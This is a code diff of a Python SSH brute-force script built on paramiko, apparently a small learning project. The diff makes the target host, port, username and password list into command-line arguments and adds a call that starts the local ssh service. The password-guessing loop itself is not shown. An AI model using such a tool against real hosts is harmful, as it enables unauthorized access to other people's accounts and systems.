@@ -1,20 +1,29 @@
 import paramiko
+import subprocess
 import time
+import argparse
 
+parser = argparse.ArgumentParser(description='Brute force to SSH')
+parser.add_argument('host', help='host to connect ssh')
+parser.add_argument('port', help='port you will use to connect ssh')
+parser.add_argument('username', help='usernaem you will brute force')
+parser.add_argument('passlst', help='file with all the passwords')
+args = parser.parse_args()
 
-f = open("list.txt", "r")
-content = f.readlines()
 
 validate = False
 
-host = "localhost"
 
-port = 22
+host = args.host 
+port = args.port 
+username = args.username
+passlst = args.passlst
 
-username = "kali"
+f = open(passlst, "r")
+content = f.readlines()
 
+subprocess.run(['service', 'ssh', ' start'])
 ssh = paramiko.SSHClient()
-
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
